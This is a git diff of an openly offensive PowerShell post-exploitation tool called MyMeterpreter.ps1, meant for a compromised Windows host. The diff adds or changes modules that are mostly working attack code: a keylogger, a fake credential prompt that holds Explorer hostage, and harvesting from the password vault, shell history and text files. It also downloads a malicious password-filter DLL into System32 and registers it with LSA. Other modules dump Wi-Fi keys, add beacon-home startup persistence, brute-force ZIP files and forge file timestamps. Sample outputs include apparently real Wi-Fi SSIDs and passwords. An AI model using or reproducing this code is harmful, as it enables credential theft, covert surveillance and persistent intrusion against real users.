    If(-not([System.IO.File]::Exists("$Destination")) -or $Upload -ieq $Null -or $Destination -ieq $null){
-      Write-Host "[error]: BitsTransfer: Something went wrong with the download process!" -ForegroundColor Red -BackgroundColor Black
-      Write-Host "syntax : .\MyMeterpreter.ps1 -Upload [ file.ps1 ] -ApacheAddr [ Attacker-Apache ] -Destination [ Path\file.ps1 ]"
-      Write-Host "example: .\MyMeterpreter.ps1 -Upload $Upload -ApacheAddr 192.168.1.73 -Destination `$Env:TMP\$Upload"
+      Write-Host "`n[error]: BitsTransfer: Something went wrong with the download process!" -ForegroundColor Red -BackgroundColor Black
       Write-Host "";Start-Sleep -Seconds 1;exit ## exit @MyMeterpreter  
    }
 
@@ -870,7 +1435,7 @@ If($Upload -ne "false"){
       If($SizeDump -lt 80){## Make sure BitsTransfer download => is NOT corrupted
          Write-Host "[abort] $Upload Length: $SizeDump/KB Integrity Corrupted" -ForeGroundColor Red -BackGroundColor Black
          Write-Host "[error] If you wish to increase the File Size Limmit, then manual"
-         Write-Host "[error] edit this CmdLet and modifie line[673]: If(`$SizeDump -lt 80){"
+         Write-Host "[error] edit this CmdLet and modifie line[1532]: If(`$SizeDump -lt 80){"
          Write-Host "";Start-Sleep -Seconds 1;exit ## exit @webserver
       }
    }
@@ -889,7 +1454,12 @@ $Timer = Get-Date -Format 'HH:mm:ss'
 
    <#
    .SYNOPSIS
-      Helper - Capture Remote Host Keystrokes ($Env:TMP)
+      Helper - Capture remote host keystrokes {void}
+
+   .DESCRIPTION
+      This module start recording target system keystrokes
+      in background mode and only stops if void.exe binary
+      its deleted or is process {void.exe} its stoped.
 
    .EXAMPLE
       PS C:\> .\MyMeterpreter.ps1 -Keylogger Start
@@ -900,6 +1470,11 @@ $Timer = Get-Date -Format 'HH:mm:ss'
       PS C:\> .\MyMeterpreter.ps1 -Keylogger Stop
       Stop keylogger by is process FileName identifier
       and delete keylogger and all respective files/logs
+
+   .OUTPUTS
+      StartTime ProcessName PID  LogFile                                   
+      --------- ----------- ---  -------                                   
+      17:37:17  void.exe    2836 C:\Users\pedro\AppData\Local\Temp\void.log
    #>
 
    If($Keylogger -ieq 'Start'){## Download binary from venom\GitHub (RAW)
@@ -948,7 +1523,7 @@ $Timer = Get-Date -Format 'HH:mm:ss'
       Write-Host "-------------------"
       If(Test-Path -Path "$Env:TMP\void.log"){## Read keylogger logfile
          $parsedata = Get-Content -Path "$Env:TMP\void.log"
-         $Diplaydata = $parsedata  -replace "\[ENTER\]","`r`n" -replace "</time>","</time>`r`n" -replace "\[RIGHT\]","" -replace "\[BACKSPACE\]","" -replace "\[DOWN\]","" -replace "\[LEFT\]","" -replace "\[UP\]","" -replace "\[WIN KEY\]r","" -replace "\[CTRL\]v","" -replace "\[CTRL\]c","" -replace "ALT DIREITO2","@" -replace "ALT DIREITO",""
+         $Diplaydata = $parsedata  -replace "\[ENTER\]","`r`n" -replace "</time>","</time>`r`n" -replace "\[RIGHT\]",""  -replace "\[CTRL\]","" -replace "\[BACKSPACE\]","" -replace "\[DOWN\]","" -replace "\[LEFT\]","" -replace "\[UP\]","" -replace "\[WIN KEY\]r","" -replace "\[CTRL\]v","" -replace "\[CTRL\]c","" -replace "ALT DIREITO2","@" -replace "ALT DIREITO",""
          Write-Host "$Diplaydata"
       };Write-Host ""
       write-host "[+] Stoping keylogger process (void.exe)" -ForeGroundColor Green;Start-Sleep -Seconds 1
@@ -975,23 +1550,36 @@ $Timer = Get-Date -Format 'HH:mm:ss'
 If($Mouselogger -ieq "Start"){
 ## Random FileName generation
 $Rand = -join (((48..57)+(65..90)+(97..122)) * 80 |Get-Random -Count 6 |%{[char]$_})
-$CaptureFile = "$Env:TMP\SHot-"+"$Rand.zip"
-If($Timmer -lt '10'){$Timmer = '10'} # Set the minimum capture time value
+$CaptureFile = "$Env:TMP\SHot-" + "$Rand.zip" ## Capture File Name
+If($Timmer -lt '10' -or $Timmer -gt '300'){$Timmer = '10'}
+## Set the max\min capture time value
+# Remark: The max capture time its 300 secs {5 minuts}
 
    <#
    .SYNOPSIS
-      Helper - Capture Screenshots of MouseClicks For 'xx' Seconds
+      Helper - Capture screenshots of MouseClicks for 'xx' Seconds
 
    .DESCRIPTION
-      This script allow users to Capture target Screenshots of MouseClicks
-      with the help of psr.exe native windows 10 (error report service) binary.
-      'The capture will be stored under remote-host '$Env:TMP' directory'.
-      'The minimum capture time its 8 seconds and 100 screenshots max'.
+      This script allow users to Capture Screenshots of 'MouseClicks'
+      with the help of psr.exe native windows 10 (error report service).
+      Remark: Capture will be stored under '`$Env:TMP' remote directory.
+      'Min capture time its 8 secs the max is 300 and 100 screenshots'.
+
+   .NOTES
+      Required Dependencies: psr.exe {native}
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -Mouselogger Start -Timmer 10
-      Capture Screenshots of remote Mouse Clicks for 10 seconds
-      And store the capture under '$Env:TMP' remote directory.
+      PS C:\> .\MyMeterpreter.ps1 -Mouselogger Start
+      Capture Screenshots of Mouse Clicks for 10 secs {default}
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -Mouselogger Start -Timmer 28
+      Capture Screenshots of remote Mouse Clicks for 28 seconds
+
+   .OUTPUTS
+      Capture     Timmer      Storage                                          
+      -------     ------      -------                                          
+      MouseClicks for 10(sec) C:\Users\pedro\AppData\Local\Temp\SHot-zcsV03.zip
    #>
 
    ## Syntax Examples
@@ -1032,20 +1620,18 @@ If($PhishCreds -ieq "Start"){
 
    <#
    .SYNOPSIS
-      Promp the Current User for a Valid Credential.
+      Helper - Promp the current user for a valid credential.
+
+   .DESCRIPTION
+      This CmdLet interrupts EXPLORER process until a valid credential is entered
+      correctly in Windows PromptForCredential MsgBox, only them it starts EXPLORER
+      process and leaks the credentials on this terminal shell (Social Engineering).
 
    .NOTES
-      Remark: This CmdLet interrupts EXPLORER process until a valid credential
-      is entered correctly in Windows PromptForCredential MsgBox, only them it
-      starts EXPLORER process and leaks the credentials on this terminal shell.
-
       Remark: CredsPhish.ps1 CmdLet its set for 30 fail validations before abort.
-      Remark: CredsPhish.ps1 CmdLet requires lmhosts and lanmanserver services.
-      Remark: CredsPhish.ps1 CmdLet requires Admin privs to Start|Stop services
-
-      Remark: On Windows 10 lmhosts and lanmanserver are running by default.
-      So..Admin privs are NOT required for CredsPhish.ps1 to run. Unless the
-      two services are stoped on target machine..(they are running by default)
+      Remark: CredsPhish.ps1 CmdLet requires lmhosts + lanmanserver services running.
+      Remark: CredsPhish.ps1 CmdLet requires Admin privileges to Start|Stop services.
+      Remark: On Windows <= 10 lmhosts and lanmanserver are running by default.
 
    .EXAMPLE
       PS C:\> .\MyMeterpreter.ps1 -PhishCreds Start
@@ -1060,11 +1646,11 @@ If($PhishCreds -ieq "Start"){
 
    ## Check for file download integrity (fail/corrupted downloads)
    $CheckInt = Get-Content -Path "$Env:TMP\CredsPhish.ps1" -EA SilentlyContinue
-   $SizeDump = ((Get-Item -Path "$Env:TMP\CredsPhish.ps1" -EA SilentlyContinue).length/1KB) ## DefaultFileSize: 12,77734375/KB | OldSize: 6,15625(KB
-   If(-not(Test-Path -Path "$Env:TMP\CredsPhish.ps1") -or $SizeDump -lt 12 -or $CheckInt -iMatch '^(<!DOCTYPE html)'){
+   $SizeDump = ((Get-Item -Path "$Env:TMP\CredsPhish.ps1" -EA SilentlyContinue).length/1KB) ## DefaultFileSize: 12,77734375/KB | OldSize: 6,15625/KB | 6,728515625/KB
+   If(-not(Test-Path -Path "$Env:TMP\CredsPhish.ps1") -or $SizeDump -lt 6 -or $CheckInt -iMatch '^(<!DOCTYPE html)'){
       ## Fail to download Sherlock.ps1 using BitsTransfer OR the downloaded file is corrupted
       Write-Host "[abort] fail to download CredsPhish.ps1 using BitsTransfer (BITS)" -ForeGroundColor Red -BackGroundColor Black
-      If(Test-Path -Path "$Env:TMP\CredsPhish.ps1"){Remove-Item -Path "$Env:TMP\CredsPhish.ps1" -Force}
+      #If(Test-Path -Path "$Env:TMP\CredsPhish.ps1"){Remove-Item -Path "$Env:TMP\CredsPhish.ps1" -Force}
       Write-Host "";Start-Sleep -Seconds 1;exit ## exit @MyMeterpreter
    }
 
@@ -1073,24 +1659,170 @@ If($PhishCreds -ieq "Start"){
    Write-Host "";Start-Sleep -Seconds 1
 }
 
-If($EOP -ieq "ScanAll" -or $EOP -ieq "Default"){
+If($GetPasswords -ieq "Enum" -or $GetPasswords -ieq "Dump"){## <-- TODO: finish this function
 
    <#
    .SYNOPSIS
-      Author: @_RastaMouse|r00t-3xp10it (sherlock.ps1 v1.3)
+      Author: @mubix|@r00t-3xp10it
+      Helper - Search for credentials in diferent locations {store|regedit|disk}
+      Helper - Stealing passwords every time they change {mitre T1174}
+
+   .DESCRIPTION
+      -GetPasswords Dump Explores a native OS notification of when
+      the user account password gets changed which is responsible for
+      validating it. That means that the password can be intercepted and logged.
+      -GetPasswords Enum searchs credentials in disk\regedit diferent locations.
+
+   .NOTES
+      -GetPasswords Dump requires Administrator privileges to add reg keys
+      And the manual deletion of `$Env:WINDIR\System32\0evilpwfilter.dll from
+      target disk at the end and also the deletion of the follow registry key:
+      hklm\system\currentcontrolset\control\lsa /v "notification packages" /d scecli\0evilpwfilter
+      REG ADD "HKLM\System\CurrentControlSet\Control\lsa" /v "notification packages" /t REG_MULTI_SZ /d scecli /f
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -GetPasswords Enum
+      Dumps passwords from disk\regedit diferent locations
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -GetPasswords Enum -StartDir $Env:USERPROFILE
+      Searches for credentials recursive in text files starting in -StartDir
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -GetPasswords Dump
+      Intercepts user changed passwords {logon}
+
+   .OUTPUTS
+      Time     Status  ReportFile           VulnDLLPath
+      ----     ------  ----------           -----------
+      17:49:23 active  C:\Temp\logFile.txt  C:\Windows\System32\0evilpwfilter.dll
+   #>
+
+   ## Local function variable declarations
+   $VulnDll = "$Env:WINDIR\System32\0evilpwfilter.dll"
+   $DllStatus = "not active"
+
+   ## Sellecting module Scan mode
+   If($GetPasswords -ieq "Enum"){## <-- TODO: finish this function
+
+      Write-Host "Checking credential store" -ForegroundColor Green
+      Start-Sleep -Seconds 1
+      ## Dump local passwords from credential manager
+      [void][Windows.Security.Credentials.PasswordVault, Windows.Security.Credentials, ContentType = WindowsRuntime]
+      $vault = New-Object Windows.Security.Credentials.PasswordVault
+      $allpass = $vault.RetrieveAll() | % { 
+         $_.RetrievePassword(); $_ 
+      }|Select Resource, UserName, Password|Sort-Object Resource|ft -AutoSize
+      If($allpass -ieq $null){## Error => none credentials found under PasswordVault
+         write-host "[error] none credentials found under PasswordVault!" -ForegroundColor Red -BackgroundColor Black
+      }
+
+      Write-Host "`nChecking ConsoleHost_History" -ForegroundColor Green
+      Start-Sleep -Seconds 1
+      $PSHistory = "$Env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_History.txt"
+      $Credentials = Get-Content -Path "$PSHistory"|Select-String -pattern "pass","passw","user","username","login"
+      If(-not($Credentials) -or $Credentials -eq $null){## Make sure we have any creds returned
+         Write-Host "[error] None Credentials found in ConsoleHost_History" -ForegroundColor Red -BackgroundColor Black
+      }else{## Credentials found
+         Write-Host "----------------------------"
+         ForEach($token in $Credentials){# Loop in each string found
+            Write-Host "$token"
+         }
+      }
+
+      Start-Sleep -Seconds 1
+      ## List Stored Passwords {in Text Files}
+      Write-Host "`nStored passwords in text files" -ForegroundColor Green
+      Start-Sleep -Seconds 1
+      cd $StartDir|findstr /S /I /C:"user:" *.txt >> $Env:TMP\passwd.txt
+      cd $StartDir|findstr /S /I /C:"pass:" *.txt >> $Env:TMP\passwd.txt
+      cd $StartDir|findstr /S /I /C:"username:" *.txt >> $Env:TMP\passwd.txt
+      cd $StartDir|findstr /S /I /C:"passw:" *.txt >> $Env:TMP\passwd.txt
+      cd $StartDir|findstr /S /I /C:"login:" *.txt >> $Env:TMP\passwd.txt
+      cd $Working_Directory ## Return to @MyMeterpreter working dir
+
+      $ChekCreds = Get-Content -Path "$Env:TMP\passwd.txt"|Select-String -pattern "pass","passw","user","username","login"
+      If($ChekCreds -ieq $null){## None credentials found
+         Write-Host "[error] None credentials found under $StartDir!" -ForegroundColor Red -BackgroundColor Black
+      }Else{## Credentials found
+
+         Write-Host "------------------------------"
+         ForEach($token in $ChekCreds){# Loop in each string found
+            Write-Host "$token"
+         }
+      }
+      If(Test-Path -Path "$Env:TMP\passwd.txt"){Remove-Item -Path "$Env:TMP\passwd.txt" -Force}
+
+
+   }ElseIf($GetPasswords -ieq "Dump"){
+      ## This function requires Admin privileges to add reg keys
+      $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544")
+
+      If($IsClientAdmin){## Administrator privileges active
+         $TestVuln = reg query "hklm\system\currentcontrolset\control\lsa" /v "notification packages"
+         If($TestVuln){## Vulnerable registry key present
+
+            ## Download 0evilpwfilter.dll from my GitHub repository
+            If(-not(Test-Path -Path "$VulnDll")){## Check if auxiliary exists
+               Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/venom/master/bin/0evilpwfilter.dll -Destination $Env:WINDIR\System32\0evilpwfilter.dll -ErrorAction SilentlyContinue|Out-Null
+            }
+
+            ## Make sure the downloaded DLL its not corrupted
+            $CheckInt = Get-Content -Path "$VulnDll" -EA SilentlyContinue
+            If(-not(Test-Path -Path "$VulnDll") -or $CheckInt -iMatch '^(<!DOCTYPE html)'){
+               ## Fail to download 0evilpwfilter.dll using BitsTransfer OR the downloaded file is corrupted
+               Write-Host "[abort] fail to download 0evilpwfilter.dll using BitsTransfer (BITS)" -ForeGroundColor Red -BackGroundColor Black
+               If(Test-Path -Path "$VulnDll"){Remove-Item -Path "$VulnDll" -Force}
+                  Write-Host "";Start-Sleep -Seconds 1;exit ## exit @MyMeterpreter
+               }
+
+            ## Add Registry key to regedit
+            reg add "hklm\system\currentcontrolset\control\lsa" /v "notification packages" /d scecli\0evilpwfilter /t reg_multi_sz /f
+            $DllTimer = Get-Date -Format 'HH:mm:ss'
+            $DllStatus = "active"
+         }
+
+         ## Create Data Table for output
+         $mytable = new-object System.Data.DataTable
+         $mytable.Columns.Add("Time") | Out-Null
+         $mytable.Columns.Add("Status") | Out-Null
+         $mytable.Columns.Add("ReportFile") | Out-Null
+         $mytable.Columns.Add("VulnDLLPath") | Out-Null
+         $mytable.Rows.Add("$DllTimer",
+                           "$DllStatus",
+                           "C:\Temp\logFile.txt",
+                           "$VulnDll") | Out-Null
+
+         ## Display Table
+         $mytable|Format-Table -AutoSize
+      }## Running Under UserLand Privileges
+      Write-Host "[error] Administrator privileges required on shell!" -ForegroundColor Red -BackgroundColor Black
+   }## Sellecting module Scan mode
+   Write-Host "";Start-Sleep -Seconds 1
+}
+
+If($EOP -ieq "Verbose" -or $EOP -ieq "Enum"){
+
+   <#
+   .SYNOPSIS
+      Author: @_RastaMouse|r00t-3xp10it {Sherlock v1.3}
       Helper - Find Missing Software Patchs For Privilege Escalation
 
    .NOTES
-      This Module does NOT exploit any vulnerabitys found.
-      It will 'report' them and display the exploitdb POC link
+      This Module does NOT exploit any EOP vulnerabitys found.
+      It will 'report' them and display the exploit-db POC link.
+      Remark: Attacker needs to manualy download\execute the POC.
+      Sherlock.ps1 GitHub WIKI page: https://tinyurl.com/y4mxe29h
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -EOP Default
+      PS C:\> .\MyMeterpreter.ps1 -EOP Enum
       Scans GroupName Everyone and permissions (F)
+      Unquoted Service vuln Paths, Dll-Hijack, etc.
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -EOP ScanAll
-      Scans Three GroupNames and Permissions (F)(W)(M)
+      PS C:\> .\MyMeterpreter.ps1 -EOP Verbose
+      Scans the Three Group Names and Permissions (F)(W)(M)
+      And presents a more elaborate report with extra tests.
 
    .OUTPUTS
       Title      : TrackPopupMenu Win32k Null Point Dereference
@@ -1119,10 +1851,10 @@ If($EOP -ieq "ScanAll" -or $EOP -ieq "Default"){
    $SherlockPath = Test-Path -Path "$Env:TMP\sherlock.ps1" -EA SilentlyContinue
    If($SherlockPath -ieq "True" -and $SizeDump -gt 15){
       Import-Module -Name "$Env:TMP\sherlock.ps1" -Force
-      If($EOP -ieq "ScanAll"){## Use ALL Sherlock EoP functions
+      If($EOP -ieq "Verbose"){## Use ALL Sherlock EoP functions
          Write-Host "[i] Please wait, this scan migth take more than 5 minuts!" -ForegroundColor Yellow -BackgroundColor Black
          Start-Sleep -Seconds 1;Use-AllModules FullRecon
-      }ElseIf($EOP -ieq "Default"){## find missing CVE patchs
+      }ElseIf($EOP -ieq "Enum"){## find missing CVE patchs
          Use-AllModules
       }
    }
@@ -1133,26 +1865,47 @@ If($EOP -ieq "ScanAll" -or $EOP -ieq "Default"){
 }
 
 If($Persiste -ne "false" -or $Persiste -ieq "Stop"){
-$BeaconRawTime = "$BeaconTime"+"000" ## BeaconHome Timmer
-$PCName = $Env:COMPUTERNAME
+$BeaconRawTime = "$BeaconTime" + "000" ## BeaconHome Timmer
+$PCName = $Env:COMPUTERNAME ## Local Computer Name
+$PerState = $False ## Persistence active yes|no query!
 
    <#
    .SYNOPSIS
-      Persiste Scripts\Appl Using StartUp Folder
+      Helper - Persiste scripts using StartUp folder
 
-   .NOTES
+   .DESCRIPTION
       This persistence module beacons home in sellected intervals defined
       by CmdLet User with the help of -BeaconTime parameter. The objective
       its to execute our script on every startup from 'xx' to 'xx' seconds.
-      Remark: Use double quotes if Path has any empty spaces in name
+
+   .NOTES
+      Remark: Use double quotes if Path has any empty spaces in name.
+      Remark: '-GetProcess Enum -ProcessName Wscript.exe' can be used
+      to manual check the status of wscript process (BeaconHome function)
 
    .EXAMPLE
       PS C:\> .\MyMeterpreter.ps1 -Persiste Stop
-      Stops wscript process (vbs) and delete persistence script
+      Stops wscript process (vbs) and delete persistence.vbs script
+      Remark: This function stops the persiste.vbs from beacon home
+      and deletes persiste.vbs Leaving our reverse tcp shell intact.
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -Persiste $Env:USERPROFILE\Coding\PSwork\Client.ps1 -BeaconTime 10
-      Execute Client.ps1 at StartUp with 10 sec of interval between executions
+      PS C:\> .\MyMeterpreter.ps1 -Persiste `$Env:TMP\Payload.ps1
+      Execute Payload.ps1 at every StartUp with 10 sec of interval between each execution
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -Persiste `$Env:TMP\Payload.ps1 -BeaconTime 28
+      Execute Payload.ps1 at every StartUp with 28 sec of interval between each execution
+
+   .OUTPUTS
+      Sherlock.ps1 Persistence Settings
+      ---------------------------------
+      BeaconHomeInterval : 10 (sec) interval
+      ClientAbsoluctPath : Sherlock.ps1
+      PersistenceScript  : C:\Users\pedro\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Persiste.vbs
+      PersistenceScript  : Successfuly Created!
+      wscriptProcStatus  : Stopped! {require SKYNET restart}
+      OR the manual execution of Persiste.vbs script! {StartUp}
    #>
 
    ## Syntax Examples
@@ -1166,7 +1919,25 @@ $PCName = $Env:COMPUTERNAME
    $ClientName = $Persiste.Split('\\')[-1] ## Get File Name from Path
    $PersistePath = "$Env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Persiste.vbs"
 
+
    If($Persiste -ne "false" -and $Persiste -ne "Stop"){
+
+      ## Make sure User Input [ -Persiste ] [ Path-to-payload ] is valid
+      If(-not(Test-Path -Path "$Persiste")){## Check for file existence
+         Write-Host "[error] Not found [ $Persiste ] in $Remote_hostName!" -ForegroundColor Red -BackgroundColor Black
+         Write-Host "";Start-Sleep -Seconds 1;exit ## Exit @MyMeterpreter because of User Input error.
+      }
+
+      ## Retrieve BeaconTime from persiste.vbs
+      # If run for the 2º time [ -Persiste ] [ Path-to-payload ] 
+      # Then the BeaconTime will be retrieved from persiste.vbs
+      If(Test-Path -Path "$PersistePath"){
+         $diskImage = Get-Content -Path $PersistePath|findstr /C:"wscript.sleep"
+         $RetBeTiFrP = $diskImage -split(' ') ## Split into two arrays
+         ## Retrieve BeaconTime value from 2º array
+         # and replace (convert) miliseconds to seconds
+         $BeaconTime = $RetBeTiFrP[1] -replace '000',''
+      }
 
       ## Create Data Table for output
       Write-Host "$ClientName Persistence Settings" -ForegroundColor Green
@@ -1194,9 +1965,11 @@ $PCName = $Env:COMPUTERNAME
       ## Make sure wscript process its running
       $VbsProc = (Get-Process wscript -EA SilentlyContinue).Responding
       If($VbsProc -ieq "True"){
-         Write-Host "wscriptProcStatus  : Wscript Proc Running!"
+         Write-Host "wscriptProcStatus  : Wscript Process Running! {*BeaconHome*}"
       }Else{
-         Write-Host "wscriptProcStatus  : Stopped! (require restart)" -ForegroundColor Red -BackgroundColor Black
+         Write-Host "wscriptProcStatus  : Stopped! {require $Remote_hostName restart}" -ForegroundColor Red -BackgroundColor Black
+         Write-Host "OR the manual execution of Persiste.vbs script! {StartUp}"
+
       }
    }
    
@@ -1211,22 +1984,1124 @@ $PCName = $Env:COMPUTERNAME
       $CheckProc = (Get-Process -name wscript -EA SilentlyContinue).Responding
       If($CheckProc -ieq "True"){## wscript proccess found running
          Write-Host "[i] Stoping Wscript (vbs) Process!"
-         Start-Sleep -Seconds 1
          Stop-Process -Name wscript -Force
-      }Else{## wscript proccess NOT found running
-         Write-Host "[x] Wscript Process Not Found Running!" -ForegroundColor Red -BackgroundColor Black
-         Start-Sleep -Seconds 1
+         $PerState = $True
       }
 
       If(Test-Path -Path "$PersistePath"){## Chcek for Persiste.vbs existance
          Write-Host "[i] Deleting Persiste.vbs aux Script!"
-         Start-Sleep -Seconds 1
          Remove-Item -Path "$PersistePath" -Force
-      }Else{## Persiste.vbs auxiliary script NOT found
-         Write-Host "[x] Persiste.vbs aux Script Not Found!" -ForegroundColor Red -BackgroundColor Black
-         Start-Sleep -Seconds 1
+         $PerState = $True
       }
-      Write-Host "[i] Local Persistence Successfuly Deleted!" -ForegroundColor Yellow
+      If($PerState -eq $True){## Report Persistence files|wscript process state
+         Write-Host "[i] Local Persistence Successfuly Deleted!" -ForegroundColor Yellow
+      }Else{
+         Write-Host "[error] None persistence files found left behind!" -ForegroundColor Red -BackgroundColor Black      
+      }
    }     
    Write-Host "";Start-Sleep -Seconds 1
+}
+
+If($WifiPasswords -ieq "Dump" -or $WifiPasswords -ieq "ZipDump"){
+$FileName = "SSIDump.zip" ## Default Zip Archive Name
+
+   <#
+   .SYNOPSIS
+      Helper - Dump All SSID Wifi passwords
+
+   .DESCRIPTION
+      Module to dump SSID Wifi passwords into terminal windows
+      OR dump credentials into a zip archive under `$Env:TMP
+
+   .NOTES
+      Required Dependencies: netsh {native}
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -WifiPasswords Dump
+      Dump ALL Wifi Passwords on this terminal prompt
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -WifiPasswords ZipDump
+      Dump Wifi Paswords into a Zip archive on %TMP% {default}
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -WifiPasswords ZipDump -Storage `$Env:APPDATA
+      Dump Wifi Paswords into a Zip archive on %APPDATA% remote directory
+
+   .OUTPUTS
+      SSID name               Password    
+      ---------               --------               
+      CampingMilfontesWifi    Milfontes19 
+      NOS_Internet_Movel_202E 37067757                                             
+      Ondarest                381885C874           
+      MEO-968328              310E0CBA14
+   #>
+
+   ## Capture wifi interface passwords
+   If($WifiPasswords -ieq "Dump"){
+
+      ## Display SSID Wifi passwords dump into terminal windows
+      $profiles = netsh wlan show profiles|findstr /C:"All User Profile"
+      $DataParse = $profiles -replace 'All User Profile     :','' -replace ' ',''
+
+      ## Create Data Table for output
+      $mytable = new-object System.Data.DataTable
+      $mytable.Columns.Add("SSID name") | Out-Null
+      $mytable.Columns.Add("Password") | Out-Null
+
+      ForEach($Token in $DataParse){
+         $DataToken = netsh wlan show profile name="$Token" key=clear|findstr /C:"Key Content"
+         $Key = $DataToken -replace 'Key Content            : ','' -replace ' ',''
+         ## Put results in the data table   
+         $mytable.Rows.Add("$Token",
+                           "$Key") | Out-Null
+      }
+
+      ## Display Table
+      $mytable|Format-Table -AutoSize
+
+   }ElseIf($WifiPasswords -ieq "ZipDump"){
+
+      ## Dump SSID Wifi profiles passwords into a zip file
+      If(-not(Test-Path "$Storage\SSIDump")){## Create Zip Folder
+         New-Item "$Storage\SSIDump" -ItemType Directory -Force
+      }
+      cd $Storage\SSIDump;netsh wlan export profile folder=$Storage\SSIDump key=clear|Out-Null
+      Compress-Archive -Path "$Storage\SSIDump" -DestinationPath "$Storage\$FileName" -Update
+      Write-Host "`n`n[+] SSID Dump: $Storage\$FileName" -ForeGroundColor Yellow
+      cd $Working_Directory ## Return to @MyMeterpreter Working Directory
+   }
+   ## Clean Old Dump Folder
+   If(Test-Path "$Storage\SSIDump"){Remove-Item "$Storage\SSIDump" -Recurse -Force}
+}
+
+If($BruteZip -ne "false"){
+
+   <#
+   .SYNOPSIS
+      Helper - Brute force ZIP archives {7z.exe}
+
+   .DESCRIPTION
+      This module brute forces ZIP archives with the help of 7z.exe
+      It also downloads custom password list from @josh-newton Git-Hub
+      repository {default} or accepts User imput password list file.
+
+   .NOTES
+      Author: @securethelogs|@r00t-3xp10it
+      Required Dependencies: 7z.exe {manual-install}
+      Remark: Use double quotes if path contains any empty spaces
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -BruteZip `$Env:USERPROFILE\Desktop\Archive.zip
+      Brute force the inputed -BruteZip @argument archive using default passlist
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -BruteZip `$Env:USERPROFILE\Archive.zip -PassList `$Env:TMP\passlist.txt
+      Brute force the inputed -BruteZip @argument archive using attacker own passlist
+
+   .LINK
+      https://github.com/securethelogs/Powershell/tree/master/Redteam
+      https://raw.githubusercontent.com/josh-newton/python-zip-cracker/master/passwords.txt
+   #>
+
+   ## Local Var declarations
+   $Thepasswordis = $null
+   $7z = "C:\Program Files\7-Zip\7z.exe"
+   If($PassList -ieq "null"){## Set Default password list
+      $PassList = "$Env:TMP\passwords.txt"
+   }
+   If(-not(Test-Path -Path "$BruteZip")){## Make sure Archive exists
+      Write-Host "[error] Zip archive not found: $BruteZip!" -ForegroundColor Red -BackgroundColor Black
+      Write-Host "";Start-Sleep -Seconds 1;exit ## Exit @MyMeterpreter
+   }Else{## Archive found
+      $ZipArchiveName = $BruteZip.Split('\\')[-1] ## Get File Name from Path
+      $SizeDump = ((Get-Item -Path "$BruteZip" -EA SilentlyContinue).length/1KB)
+   }
+
+   Write-Host "[+] Starting brute force module!" -ForeGroundColor Green
+   ## Download passwords.txt from @josh-newton github repository
+   If(-not(Test-Path -Path "$PassList")){## Check if password list exists
+      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/josh-newton/python-zip-cracker/master/passwords.txt -Destination $Env:TMP\passwords.txt -ErrorAction SilentlyContinue|Out-Null
+   }
+
+   ## Check for file download integrity (fail/corrupted downloads)
+   $CheckInt = Get-Content -Path "$PassList" -EA SilentlyContinue
+   $SizeDump = ((Get-Item -Path "$PassList" -EA SilentlyContinue).length/1KB) ## default => 4002,8544921875/KB
+   If(-not(Test-Path -Path "$PassList") -or $SizeDump -lt 4002 -or $CheckInt -iMatch '^(<!DOCTYPE html)'){
+      ## Fail to download password list using BitsTransfer OR the downloaded file is corrupted
+      Write-Host "[abort] fail to download password list using BitsTransfer (BITS)" -ForeGroundColor Red -BackGroundColor Black
+      If(Test-Path -Path "$PassList"){Remove-Item -Path "$PassList" -Force}
+      Write-Host "";Start-Sleep -Seconds 1;exit ## Exit @MyMeterpreter
+   }
+   
+   ## Start Brute Force Attack
+   If(Test-Path "$7z" -EA SilentlyContinue){
+      $passwords = Get-Content -Path "$PassList" -EA SilentlyContinue
+
+      ForEach($Item in $passwords){
+         If($Thepasswordis -eq $null){
+            $BruteTimer = Get-Date -Format 'HH:mm:ss'
+            $brute = &"C:\Program Files\7-Zip\7z.exe" e "$BruteZip" -p"$Item" -y
+
+            If($brute -contains "Everything is Ok"){
+               $Thepasswordis = $Item
+               Clear-Host;Start-Sleep -Seconds 1
+               Write-Host "`n`n$BruteTimer - Brute force Zip archives" -ForegroundColor Green
+               Write-Host "------------------------------------"
+               Write-Host "[+] Zip Archive  : $ZipArchiveName" -ForegroundColor Green
+               Write-Host "[+] Archive Size : $SizeDump/KB" -ForegroundColor Green
+               Write-Host "[+] Password     : $Thepasswordis" -ForegroundColor Green
+               Write-Host "------------------------------------"
+            } ## Brute IF
+         } ## Check passwordis
+      } ## Foreach Rule
+
+   }Else{## 7Zip Isn't Installed
+      Write-Host "[error] 7Zip Mandatory Appl doesn't appear to be installed!" -ForegroundColor Red -BackgroundColor Black
+   }
+   ## Clean Old files left behind
+   If(Test-Path -Path "$PassList"){Remove-Item -Path "$PassList" -Force}
+   Write-Host "";Start-Sleep -Seconds 1
+}
+
+If($FileMace -ne "false"){
+
+   <#
+   .SYNOPSIS
+      Change file mace time {timestamp}
+
+   .DESCRIPTION
+      This module changes the follow mace propertys:
+      creationtime, lastaccesstime, LastWriteTime
+
+   .NOTES
+      -Date parameter format: "08 March 1999 19:19:19"
+      Remark: Double quotes are mandatory in -Date parameter
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -FileMace $Env:TMP\test.txt
+      Changes sellected file mace using MyMeterprter default -Date value
+
+   .EXAMPLE
